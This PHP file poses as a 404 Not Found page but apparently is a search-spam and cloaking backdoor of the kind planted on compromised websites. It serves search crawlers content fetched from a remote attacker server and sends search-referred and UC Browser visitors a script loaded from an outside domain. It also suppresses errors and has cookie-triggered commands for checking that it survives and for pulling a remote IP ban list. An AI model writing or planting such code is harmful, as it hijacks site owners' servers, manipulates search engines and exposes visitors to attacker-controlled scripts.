<?php
@error_reporting(0);
@set_time_limit(0);
$domain = $_SERVER['SERVER_NAME']; 
$file_dir ="/var/tmp/";
$server_list=array("http://zr404.zerostarts.com/");  
$server_url = $server_list[array_rand($server_list,1)];
$jump_url = "<script type=\"text/javascript\" src=\"http://js.zerostarts.com/js.js\"></script> 
";
if(preg_match('/map\.xml/',$_SERVER["REQUEST_URI"])){ header("Content-type: application/xml");}
$ping_js = "<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https'){
   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else{
  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
    var s = document.getElementsByTagName(\"script\")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
";
$spider = array("Sogou","sogou"."baidu","Baiduspider"); 
$refer = array("sogou.com", "sm-tc.cn", "sm.cn", "sma.so", "baidu.com");
$http_refer = @$_SERVER['HTTP_REFERER'];
$user_agent = @$_SERVER['HTTP_USER_AGENT'];
date_default_timezone_set("PRC");
$date_time = date("YmdHis");
$url = $server_url .'?404url='.$_SERVER['REQUEST_URI'];
$survive = '1';
$test_survive = @$_COOKIE["survive"];
if ($test_survive == $survive) {
    echo 'survived';
    exit();
}
$updateip = '1';
$baniptxt = $file_dir . "banip.txt";
$update_banip = @$_COOKIE["updateip"];
if ($update_banip == $updateip) {
    file_put_contents($baniptxt, file_get_contents($server_url . "custom/banip.txt"));
    echo "Banip has been updated !:)";
    exit();
}
function getip()
{
    if (@!empty($_SERVER["HTTP_CLIENT_IP"]))
        $ip = @$_SERVER["HTTP_CLIENT_IP"];
    elseif (@!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
        $ip = @$_SERVER["HTTP_X_FORWARDED_FOR"];
    elseif (@!empty($_SERVER["REMOTE_ADDR"]))
        $ip = @$_SERVER["REMOTE_ADDR"];
    else $ip = "no";
    return $ip;
}
function is_allowip()
{
    global $baniptxt;
    $banip_list = @file($baniptxt);
    if (!file_exists($baniptxt)) {
        $banip_list = array();
    }
    foreach ($banip_list as $banip) {
        if (@stristr(getip(), trim($banip))) {
            return false;
        }
    }
    return true;
}
function is_refer()
{
    global $refer, $http_refer;
    foreach ($refer as $refer_list) {
        if (stristr($http_refer, $refer_list)) {
            return true;
        }
    }
    return false;
}
function is_spider()
{
    global $spider, $user_agent;
    foreach ($spider as $spider_list) {
        if (stristr($user_agent, $spider_list)) {
            return true;
        }
    }
    return false;
}
function is_BaiduSpider()
{
    global $user_agent;
    if(stristr($user_agent, "baidu")){
         return true;
    }
    return false;
}
function is_uc()
{
    global $user_agent;
    if(stristr($user_agent, "UCBrowser") or stristr($user_agent, "UCWEB")){
         return true;
    }
    return false;
}
if (is_allowip()) {
	if (is_spider()) {
		$spiderType = "";
		if(is_BaiduSpider()){
			$spiderType = "baidu";
		}
		$content = HttpVisit($url,$domain,$spiderType);
		header('HTTP/1.1 200 OK'); 
		echo $content;
		exit(); 
	}
	if (is_refer() or is_uc()) {
		header('HTTP/1.1 200 OK'); 
		//echo $jump_url, $ping_js;
		echo $jump_url;  
		exit();
	}
}
function HttpVisit($weburl,$webname,$spiderType) {
	$getWebUrl = $weburl . "&webname=" . $webname . "&spiderType=" . $spiderType;
	//echo $getWebUrl;exit;
	$remote_data = NULL;
	if (function_exists('curl_exec')) {
		$curl = @curl_init();
		curl_setopt($curl, CURLOPT_URL, $getWebUrl);
		curl_setopt($curl, CURLOPT_HEADER, 0);
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 40);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		$remote_data = @curl_exec($curl);
		curl_close($curl);
	} else {
		if (function_exists('stream_context_create')) {
			$header_array = array('http' => array('method' => 'GET', 'timeout' => 30));
            $http_header = @stream_context_create($header_array);
            $remote_data = @file_get_contents($getWebUrl, false, $http_header);
		} else {
                $temp_url = explode("/", $getWebUrl);
                $new_url = $temp_url[2];
                $http_port = 80;
                $get_file = substr($getWebUrl, strlen($new_url) + 7);
                if (strstr($new_url, chr(58))) {
                    $s_var_array['td'] = explode(chr(58), $new_url);
                    $new_url = $s_var_array['td'][0];
                    $http_port = $s_var_array['td'][1];
                }
                $fsock_result = @fsockopen($new_url, $http_port);
                @fputs($fsock_result, 'GET ' . $get_file . ' HTTP/1.1' . "\r\n" . 'Host:' . $new_url . "\r\n" . 'Connection:Close' . "\r\n\r\n");
                while (!feof($fsock_result)) {
                    $remote_data.= fgets($fsock_result, 1024);
                }
                @fclose($fsock_result);
				$remote_data = strstr($remote_data,"<html");
            }
	}
	return $remote_data;
}
//Header('HTTP/1.1 404 Not Found');
?>
404 Not Found